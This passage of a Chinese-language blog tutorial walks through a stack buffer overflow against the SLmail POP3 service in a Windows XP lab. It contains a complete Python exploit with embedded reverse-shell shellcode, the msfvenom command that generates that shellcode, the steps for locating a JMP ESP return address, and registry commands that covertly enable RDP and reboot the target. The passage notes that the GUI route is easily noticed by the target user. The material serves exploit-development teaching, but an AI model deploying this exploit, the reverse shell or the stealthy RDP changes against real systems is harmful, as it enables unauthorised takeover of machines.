class="string">b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span></span><br><span class="line">            <span class="string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span></span><br><span class="line">            <span class="string">b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span></span><br><span class="line">            <span class="string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span></span><br><span class="line">            <span class="string">b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span></span><br><span class="line">            <span class="string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span></span><br><span class="line">            <span class="string">b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b'A'</span>* <span class="number">2606</span> + <span class="string">b'BBBB'</span> + badchars</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Sending buffer..."</span>)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">    s.send(<span class="string">b'USER test\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">b'PASS '</span> + buffer + <span class="string">b'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">b'Quit\r\n'</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="follow_in_dump.png" alt="follow in dump"></p>
+<blockquote>
+<blockquote>
+<p>在运行完脚本后，我们的程序将再次「paused」，这时右键「ESP」选择<code>「Follow in Dump」</code></p>
+</blockquote>
+</blockquote>
+<p><img src="hex.png" alt="hex"></p>
+<blockquote>
+<blockquote>
+<p>切换显示的方式默认当然选择为「Disassemble」，切换「Hex」选择<code>「Hex/ASCII（16bytes）」</code></p>
+</blockquote>
+</blockquote>
+<p><img src="0a.png" alt="0a"></p>
+<blockquote>
+<blockquote>
+<p>这个时候能清晰看见，在内存中存放的二进制，\x01,\x02…\xAA<br>我们可以发现\x0a，没有被正确显示，同时其后的字符也消失了<br>这个时候我们需要剔除<code>\x0a</code>这个坏字符，再次进行测试</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>通过剔除坏字符我们知道了<code>\x0a</code>，<code>\x0d</code>和<code>\x00</code>是不能在<code>shellcode</code>中出现的</p>
+</li>
+</ul>
+<h3 id="定位跳转地址"><a href="#定位跳转地址" class="headerlink" title="定位跳转地址"></a>定位跳转地址</h3><p><code>EIP</code>的修改方法和定位已经被找到，但具体修改成什么，这是一个问题。前面的操作，我们发现，在<code>EIP</code>后填写的内容将会修改<code>ESP</code>，如果我们能跳转到<code>ESP</code>，那么问题将得到有效推动。我们知道，<code>JMP</code>命令可以实现程序的跳转，跳转到<code>ESP</code>的命令，便是<code>JMP ESP</code>。但是我们无法直接使用这个指令，原因是我们当前只是获得了修改<code>EIP</code>的权限，而不是修改程序代码的权限。<code>EIP</code>能指向需要执行的内存地址，而不是存储指令。<br>一条弯曲的道路由此展开：我们可以通过修改<code>EIP</code>跳转到存放有<code>JMP ESP</code>指令的内存地址，实现目的。</p>
+<p>  <img src="jmp.png" alt="jmp"></p>
+<blockquote>
+<blockquote>
+<p>图解 EIP (JMP ESP) -&gt; ESP (Shell Code)</p>
+</blockquote>
+</blockquote>
+<p>现在问题变换为<code>找到存放有JMP ESP指令的内存地址</code>，为了使攻击具有普遍使用性。这个指令地址应该是静态的，每次系统的重启都不会改变，另外这个地址不会因为软件重装而改变。因此，我们锁定的对象成了开机启动的服务，而且这个服务拥有固定的内存地址。在内存中存放的执行代码都是二进制，因此我们的<code>JMP ESP</code>需要首先找到对应的<code>二进制代码</code>。接着，我们通过搜索系统服务的库，找到存放有该二进制的地址，进行跳转。</p>
+<ul>
+<li><p>指令的转换</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4              jmp esp</span><br><span class="line">nasm &gt; quit</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<blockquote>
+<p>通过nasm_shll.rb这个工具，我们知道了<code>jmp esp</code>对应的二进制为<code>FFE4</code></p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>指令的搜索</p>
+<ul>
+<li><p>这里需要使用到<code>mona.py</code>进行辅佐</p>
+</li>
+<li><p>首先解压<code>mona.master</code>复制<code>mona.py</code>到<code>C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands</code>相关目录</p>
+</li>
+<li><p>「调试slmail」(保持「Paused」状态)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona modules <span class="comment">// 检索所有的模块  (查询Rebas-False, SafeSEH-False, ASLR-False, NXCompat-False, OS Dll-True )</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>rebase: 重启后地址是否修改</li>
+<li>safeSEH: 保护机制</li>
+<li>ASLR: 保护机制</li>
+<li>NXCompat: 数据执行保护DEP</li>
+<li>DLL-true: 是否为库模块<br><img src="modules.png" alt="modules"></li>
+</ul>
+</li>
+<li><p>选择相应的模块进行查询<br><img src="slmfc.png" alt="slmfc.dll"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s <span class="string">"\xff\xe4"</span> -m SLMFC.DLL   <span class="comment">// 查询模块是否存在`FFE4 (jmp esp)`汇编指令</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>双击选中的条目 （例如:<code>0x5f4a358f</code>）<br><img src="5f4a358f.png" alt="5f4a358f"></p>
+</li>
+<li><p>右击选择「Disassemble」进行切换<br><img src="disassemble.png" alt="disamble"></p>
+</li>
+<li><p>能够显示具体的反汇编代码<br><img src="ffe4.png" alt="FFE4"></p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<blockquote>
+<p>小结：至此，我们知道了<code>shellcode</code>可以填写在<code>ESP</code>中，<code>EIP</code>通过指向地址<code>0x5F4a358F</code>跳转到<code>ESP</code></p>
+</blockquote>
+</blockquote>
+<h2 id="实现控制"><a href="#实现控制" class="headerlink" title="实现控制"></a>实现控制</h2><h3 id="生成shellcode控制命令行"><a href="#生成shellcode控制命令行" class="headerlink" title="生成shellcode控制命令行"></a>生成shellcode控制命令行</h3><p><code>shellcode</code>是一小段安置在载荷中的恶意代码，其目的是对系统进行漏洞利用。之所有叫<code>shellcode</code>是因为使用者，通常是通过它来获得<code>shell</code>，进而对系统进行控制。事实上，<code>shellcode</code>不仅仅只能返回一个<code>shell</code>，就如豆浆机它可以用来打碎黄豆得到豆浆，但我们也可以放入黑豆/红豆/花生等等材料，获得所需的产物。<code>shellcode</code>是<code>网络安全</code>中十分有趣的一环<code>我们将在以后的章节展开</code>。这次的目的是<code>获得豆浆</code>，哦不，是获得shell，我们看看实际操作需要怎样进行。</p>
+<ul>
+<li><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=threadR -b &quot;\x00\x0a\x0d&quot; -f python3</code></p>
+<pre><code>* LHOST, localhost          // 本地主机地址
+* LPORT, localport          // 打开本地主机监听端口
+* EXITFUNC=thread           // 退出线程, 而不是进程 
+                            // shellcode执行结束后，exitprocss方式将退出整个进程
+                            // 导致邮件服务崩溃 (表现为 退出脚本后, 目标主机的SLmail将同时结束进程)
+
+* R, raw                    // 二进制显示
+* -p, --payload             // 选择的载荷
+* -b, --bad-chars  [list]   // 坏字符
+* -f, --format  [format]    // 语言格式
+  * msfvenom --list formats // 查询支持的语言格式</code></pre></li>
+</ul>
+<!-- * buffer = b'A'* 2606 + b"\xe3\x41\x4b\x5f" + b"\x90" * 8 + shellcode -->
+<ul>
+<li><code>buffer = b&#39;A&#39;* 2606 + b&quot;\x8f\x35\x4a\x5f&quot; + b&quot;\x90&quot; * 8 + shellcode</code><ul>
+<li><code>A</code> 2606，作为前面触发溢出的载荷</li>
+<li><code>JMP ESP</code> 在系统库中的地址是<code>0x5F4a358F</code>，X86工作在<code>小端</code>，因此高位字节写在低位</li>
+<li>增添不操作空字符 <code>\x90</code> 规避CPU将前置代码覆盖过滤, 提高执行的稳定性</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>通过对<code>载荷</code>，<code>ESP</code>地址，<code>（填充\x90）</code>和<code>shellcode</code>的缝合，我们的EXP基本完成</p>
+</li>
+<li><p>启动<code>SLmail</code>服务，不启动调试工具</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*-coding: utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">ip = <span class="string">'10.0.2.16'</span></span><br><span class="line">port = <span class="number">110</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xbd\x33\xa8\x87\x97\xd9\xc7\xd9\x74\x24\xf4\x5f\x2b"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\x52\x83\xef\xfc\x31\x6f\x0e\x03\x5c\xa6\x65"</span></span><br><span class="line">buf += <span class="string">b"\x62\x5e\x5e\xeb\x8d\x9e\x9f\x8c\x04\x7b\xae\x8c\x73"</span></span><br><span class="line">buf += <span class="string">b"\x08\x81\x3c\xf7\x5c\x2e\xb6\x55\x74\xa5\xba\x71\x7b"</span></span><br><span class="line">buf += <span class="string">b"\x0e\x70\xa4\xb2\x8f\x29\x94\xd5\x13\x30\xc9\x35\x2d"</span></span><br><span class="line">buf += <span class="string">b"\xfb\x1c\x34\x6a\xe6\xed\x64\x23\x6c\x43\x98\x40\x38"</span></span><br><span class="line">buf += <span class="string">b"\x58\x13\x1a\xac\xd8\xc0\xeb\xcf\xc9\x57\x67\x96\xc9"</span></span><br><span class="line">buf += <span class="string">b"\x56\xa4\xa2\x43\x40\xa9\x8f\x1a\xfb\x19\x7b\x9d\x2d"</span></span><br><span class="line">buf += <span class="string">b"\x50\x84\x32\x10\x5c\x77\x4a\x55\x5b\x68\x39\xaf\x9f"</span></span><br><span class="line">buf += <span class="string">b"\x15\x3a\x74\xdd\xc1\xcf\x6e\x45\x81\x68\x4a\x77\x46"</span></span><br><span class="line">buf += <span class="string">b"\xee\x19\x7b\x23\x64\x45\x98\xb2\xa9\xfe\xa4\x3f\x4c"</span></span><br><span class="line">buf += <span class="string">b"\xd0\x2c\x7b\x6b\xf4\x75\xdf\x12\xad\xd3\x8e\x2b\xad"</span></span><br><span class="line">buf += <span class="string">b"\xbb\x6f\x8e\xa6\x56\x7b\xa3\xe5\x3e\x48\x8e\x15\xbf"</span></span><br><span class="line">buf += <span class="string">b"\xc6\x99\x66\x8d\x49\x32\xe0\xbd\x02\x9c\xf7\xc2\x38"</span></span><br><span class="line">buf += <span class="string">b"\x58\x67\x3d\xc3\x99\xae\xfa\x97\xc9\xd8\x2b\x98\x81"</span></span><br><span class="line">buf += <span class="string">b"\x18\xd3\x4d\x05\x48\x7b\x3e\xe6\x38\x3b\xee\x8e\x52"</span></span><br><span class="line">buf += <span class="string">b"\xb4\xd1\xaf\x5d\x1e\x7a\x45\xa4\xc9\x8f\x9a\xa4\x06"</span></span><br><span class="line">buf += <span class="string">b"\xf8\x98\xa8\x09\xa4\x15\x4e\x43\x44\x70\xd9\xfc\xfd"</span></span><br><span class="line">buf += <span class="string">b"\xd9\x91\x9d\x02\xf4\xdc\x9e\x89\xfb\x21\x50\x7a\x71"</span></span><br><span class="line">buf += <span class="string">b"\x31\x05\x8a\xcc\x6b\x80\x95\xfa\x03\x4e\x07\x61\xd3"</span></span><br><span class="line">buf += <span class="string">b"\x19\x34\x3e\x84\x4e\x8a\x37\x40\x63\xb5\xe1\x76\x7e"</span></span><br><span class="line">buf += <span class="string">b"\x23\xc9\x32\xa5\x90\xd4\xbb\x28\xac\xf2\xab\xf4\x2d"</span></span><br><span class="line">buf += <span class="string">b"\xbf\x9f\xa8\x7b\x69\x49\x0f\xd2\xdb\x23\xd9\x89\xb5"</span></span><br><span class="line">buf += <span class="string">b"\xa3\x9c\xe1\x05\xb5\xa0\x2f\xf0\x59\x10\x86\x45\x66"</span></span><br><span class="line">buf += <span class="string">b"\x9d\x4e\x42\x1f\xc3\xee\xad\xca\x47\x0e\x4c\xde\xbd"</span></span><br><span class="line">buf += <span class="string">b"\xa7\xc9\x8b\x7f\xaa\xe9\x66\x43\xd3\x69\x82\x3c\x20"</span></span><br><span class="line">buf += <span class="string">b"\x71\xe7\x39\x6c\x35\x14\x30\xfd\xd0\x1a\xe7\xfe\xf0"</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b'A'</span>* <span class="number">2606</span> + <span class="string">b"\x8f\x35\x4a\x5f"</span> + <span class="string">b"\x90"</span> * <span class="number">8</span> + buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Sending buffer..."</span>)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">    s.send(<span class="string">b'USER test\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">b'PASS '</span> + buffer + <span class="string">b'\r\n'</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    s.close()</span><br><span class="line">    print(<span class="string">'close'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="local.png" alt="local"></p>
+<blockquote>
+<blockquote>
+<p>本地主机执行脚本</p>
+</blockquote>
+</blockquote>
+<p><img src="get_shell.png" alt="get shell"></p>
+<blockquote>
+<blockquote>
+<p>本地主机通过nc连接，反向连接获得的shell，获得windows XP 目标主机的shell<br>shellcode生成加入了<code>EXITFUNC=thread</code>，即使现在推出目标主机shell，重新执行也能重新获得shell</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<h3 id="控制图形界面"><a href="#控制图形界面" class="headerlink" title="控制图形界面"></a>控制图形界面</h3><p>图形界面的控制是不推介的，理由很简单，windows的图形界面控制，容易被目标用户察觉。因为主机获得windows的图形界面，会对远程主机进行锁屏，操作的时候如果有用户在旁，感知是十分明显的。windows的设置不像linux，软件的配置并不完全独立，而是通过<code>注册列表</code>这个大家伙统一管理。因此对于打开图形界面，我们的思路也可以通过修改<code>注册列表</code>来实现，在没有图形界面的接触前提下，实现防火墙端口开发等操作。</p>
+<ul>
+<li><p>具体代码如下显示</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cd\</span><br><span class="line"></span><br><span class="line">// 将<span class="string">"Windows Registry Editor Version 5.00"</span> 写入文件 `3389.reg`</span><br><span class="line">C:\&gt;echo Windows Registry Editor Version <span class="number">5.00</span>&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo Windows Registry Editor Version <span class="number">5.00</span>&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 进入终端服务的注册列表路径</span><br><span class="line">C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 防止防火墙屏蔽</span><br><span class="line">C:\&gt;echo <span class="string">"fDenyTSConnections"</span>=dword:<span class="number">00000000</span>&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo <span class="string">"fDenyTSConnections"</span>=dword:<span class="number">00000000</span>&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 进入rdpwd的TCP端口路径</span><br><span class="line">C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 开启端口<span class="number">3389</span> (hex)<span class="number">0</span>d3d ==&gt; (Dec)<span class="number">3389</span></span><br><span class="line">C:\&gt;echo <span class="string">"PortNumber"</span>=dword:<span class="number">00000</span>d3d&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo <span class="string">"PortNumber"</span>=dword:<span class="number">00000</span>d3d&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 进入WinStations RDP TCP路径</span><br><span class="line">C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 开启端口<span class="number">3389</span> (hex)<span class="number">0</span>d3d ==&gt; (Dec)<span class="number">3389</span></span><br><span class="line">C:\&gt;echo <span class="string">"PortNumber"</span>=dword:<span class="number">00000</span>d3d&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line">echo <span class="string">"PortNumber"</span>=dword:<span class="number">00000</span>d3d&gt;&gt;<span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 静默导入注册列表 [ref](https://ss64.com/nt/regedit.html)</span><br><span class="line">C:\&gt;regedit /s <span class="number">3389</span>.reg</span><br><span class="line">regedit /s <span class="number">3389</span>.reg</span><br><span class="line"></span><br><span class="line">// 立即重启主机</span><br><span class="line">C:\&gt;shutdown -r -t <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="remmina.png" alt="remmina"></p>
+<blockquote>
+<blockquote>
+<p>使用<code>RDP</code>协议，配置IP地址，用户名，密码</p>
+</blockquote>
+</blockquote>
+<p><img src="gui.png" alt="gui"></p>
+<blockquote>
+<blockquote>
+<p>获得windows的GUI界面，得到全面操作的权限</p>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://www.wikiwand.com/en/Buffer_overflow" target="_blank" rel="noopener">Buffer overflow</a></li>
+<li><a href="https://www.wikiwand.com/en/Instruction_cycle" target="_blank" rel="noopener">Instruction cycle</a></li>
+<li><a href="https://circuitglobe.com/difference-between-direct-and-indirect-addressing-modes.html" target="_blank" rel="noopener">Difference Between Direct and Indirect Addressing Modes</a></li>
+<li><a href="https://www.cnblogs.com/orangelsk/articles/16185577.html" target="_blank" rel="noopener">【汇编语言】笔记 1～8章  </a></li>
+<li><a href="https://www.cnblogs.com/orangelsk/articles/16282298.html" target="_blank" rel="noopener">【汇编语言】笔记 9～17章 </a></li>
+<li><a href="https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm" target="_blank" rel="noopener">Assembly - Registers</a></li>
+<li><a href="https://www.pianshen.com/article/16871620396/" target="_blank" rel="noopener">汇编 | 一、 物理地址寻址与CS:IP（jmp）</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/366550341" target="_blank" rel="noopener">汇编各类寄存器</a></li>
+<li><a href="https://www.cnblogs.com/csnd/p/16464886.html" target="_blank" rel="noopener">汇编中各寄存器的作用</a></li>
+<li><a href="https://www.wikiwand.com/en/Stack_buffer_overflow" target="_blank" rel="noopener">Stack buffer overflow</a></li>
+<li><a href="https://godbolt.org/" target="_blank" rel="noopener">Compiler Explorer</a></li>
+<li><a href="https://vividmachines.com/shellcode/shellcode.html" target="_blank" rel="noopener">Shellcoding for Linux and Windows Tutorial</a></li>
+<li><a href="https://gist.github.com/4u1kto/44b9fed92f9b3aed5e6d" target="_blank" rel="noopener">大端模式和小端模式</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/stackoverflow/" rel="tag"># stackoverflow</a>
+          
+            <a href="/tags/assembly/" rel="tag"># assembly</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/12/sqli/" rel="next" title="SQL注入攻击示例 (UNION 注入)">
+                <i class="fa fa-chevron-left"></i> SQL注入攻击示例 (UNION 注入)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Alopex Cheung">
+  
+  <p class="site-author-name" itemprop="name">Alopex Cheung</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="https://github.com/Alopex4" title="GitHub &rarr; https://github.com/Alopex4" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="mailto:tiandiv4@gmail.com" title="E-Mail &rarr; mailto:tiandiv4@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+    
+  </div>
+
+
+
+
+
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前置知识"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#系统信息"><span class="nav-number">2.1.</span> <span class="nav-text">系统信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具准备"><span class="nav-number">2.2.</span> <span class="nav-text">工具准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#机器语言-amp-汇编-amp-C语言"><span class="nav-number">2.3.</span> <span class="nav-text">机器语言&amp;汇编&amp;C语言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文内容"><span class="nav-number">3.</span> <span class="nav-text">正文内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一个漏洞"><span class="nav-number">3.1.</span> <span class="nav-text">一个漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区溢出攻击"><span class="nav-number">3.2.</span> <span class="nav-text">缓冲区溢出攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区攻击思路"><span class="nav-number">3.3.</span> <span class="nav-text">缓冲区攻击思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#触发溢出"><span class="nav-number">3.4.</span> <span class="nav-text">触发溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用脚本进行交互"><span class="nav-number">3.4.1.</span> <span class="nav-text">使用脚本进行交互</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#摸索缓冲区"><span class="nav-number">3.4.2.</span> <span class="nav-text">摸索缓冲区</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位缓冲"><span class="nav-number">3.5.</span> <span class="nav-text">定位缓冲</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断缓冲区大小"><span class="nav-number">3.5.1.</span> <span class="nav-text">判断缓冲区大小</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证EIP修改"><span class="nav-number">3.5.2.</span> <span class="nav-text">验证EIP修改</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进行渗透"><span class="nav-number">3.6.</span> <span class="nav-text">进行渗透</span></a><ol 